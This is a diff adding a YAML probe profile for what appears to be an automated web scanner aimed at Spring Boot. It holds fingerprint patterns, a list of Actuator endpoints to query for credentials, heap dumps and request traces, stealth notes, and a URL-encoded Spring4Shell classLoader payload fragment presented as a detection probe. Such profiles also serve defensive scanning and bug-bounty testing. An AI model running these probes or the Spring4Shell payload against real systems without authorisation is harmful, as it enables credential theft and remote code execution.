@@ -1,0 +1,152 @@
+# Spring Boot Actuator — Java API Goldmine
+# ==========================================
+# CVE-2022-22965: Spring4Shell RCE (Spring Framework < 5.3.18)
+# CVE-2023-20873: Actuator endpoint bypass in Spring Boot
+# Research 2026: /actuator/env = #1 Java bug bounty finding
+# Impact: env vars contain DB passwords, API keys, JWT secrets
+
+name: springboot
+category: Framework
+version: "1.0.0"
+
+priority: CRITICAL
+stealth_level: low
+stop_if_detected: false
+
+detection:
+  headers:
+    - name: "X-Application-Context"
+      pattern: ".*"
+      confidence: 99
+    - name: "X-Powered-By"
+      pattern: ".*Spring.*"
+      confidence: 90
+  body_patterns:
+    - pattern: "\"_links\":{\"self\":{\"href\""
+      confidence: 99
+    - pattern: "Whitelabel Error Page"
+      confidence: 85
+    - pattern: "Spring Boot"
+      confidence: 80
+
+safe_probes:
+  - path: "/actuator"
+    method: GET
+    expected_status: [200, 401, 404]
+    risk: HIGH
+    description: >
+      Spring Boot Actuator root — if 200, lists all enabled endpoints.
+      Enabled actuators vary by config; each is a potential goldmine.
+    tags: [actuator, detection, endpoints]
+
+  - path: "/actuator/env"
+    method: GET
+    expected_status: [200, 401, 403]
+    risk: CRITICAL
+    description: >
+      Environment endpoint — exposes ALL application properties:
+      database URLs with passwords, API keys, JWT secrets,
+      cloud provider credentials, SMTP passwords.
+      Most critical Spring Boot finding in bug bounty programs.
+    tags: [env, credentials, critical]
+
+  - path: "/actuator/heapdump"
+    method: GET
+    expected_status: [200, 401, 404]
+    risk: CRITICAL
+    description: >
+      JVM heap dump — downloads full Java heap memory.
+      Contains ALL in-memory data: session tokens, database results,
+      decrypted secrets, user data. Binary analysis = data extraction.
+    tags: [heapdump, memory, credentials, critical]
+
+  - path: "/actuator/mappings"
+    method: GET
+    expected_status: [200, 401]
+    risk: HIGH
+    description: >
+      Request mappings — complete API blueprint: all routes,
+      HTTP methods, handler classes. Full attack surface enumeration.
+    tags: [mappings, api-blueprint, recon]
+
+  - path: "/actuator/beans"
+    method: GET
+    expected_status: [200, 401]
+    risk: MEDIUM
+    description: >
+      Spring beans list — application architecture disclosure.
+      Reveals internal services, configurations, and dependencies.
+    tags: [beans, architecture, recon]
+
+  - path: "/actuator/health"
+    method: GET
+    expected_status: [200]
+    risk: LOW
+    description: >
+      Health check — often public. May reveal DB status,
+      disk space, connected services, and dependency health.
+    tags: [health, detection]
+
+  - path: "/actuator/loggers"
+    method: GET
+    expected_status: [200, 401]
+    risk: MEDIUM
+    description: >
+      Logger configuration — enables remote log level changes
+      when writable. Can increase logging verbosity to capture
+      sensitive data in logs.
+    tags: [loggers, config]
+
+  - path: "/actuator/httptrace"
+    method: GET
+    expected_status: [200, 401]
+    risk: HIGH
+    description: >
+      HTTP trace history — recent requests including Authorization
+      headers, cookies, and request bodies. Credential leakage.
+    tags: [httptrace, credentials, history]
+
+  # Spring4Shell detection
+  - path: "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di"
+    method: GET
+    expected_status: [200, 400, 404, 500]
+    risk: CRITICAL
+    description: >
+      CVE-2022-22965 (Spring4Shell) detection probe.
+      Checks for classLoader manipulation vulnerability in
+      Spring Framework < 5.3.18 / < 5.2.20.
+    tags: [spring4shell, rce, cve, critical]
+
+adaptive_paths:
+  high_value:
+    - /actuator
+    - /actuator/env
+    - /actuator/heapdump
+    - /actuator/mappings
+  medium_confidence:
+    - /actuator/health
+    - /manage/
+    - /management/
+
+behavior_signals:
+  - "Whitelabel Error Page = Spring Boot confirmed (with path)"
+  - "X-Application-Context header = Spring Boot version"
+  - "200 on /actuator = list of available endpoints"
+  - "heapdump accessible = CRITICAL data extraction possible"
+
+risk_patterns:
+  - "/actuator/env = all credentials in plaintext JSON"
+  - "/actuator/heapdump = full memory dump → credential extraction"
+  - "Spring4Shell: classLoader chain → OS command execution"
+  - "/actuator/loggers POST = remote log level manipulation"
+
+stealth_notes:
+  - "Check /actuator/health first (usually public, no auth)"
+  - "GET /actuator lists all enabled — map before probing each"
+  - "heapdump download is large (100MB+) — verify 200 only, don't complete"
+  - "/actuator/env masks values with '*' in newer versions — check raw"
+
+chain_with:
+  - redis
+  - elasticsearch
+  - docker_api
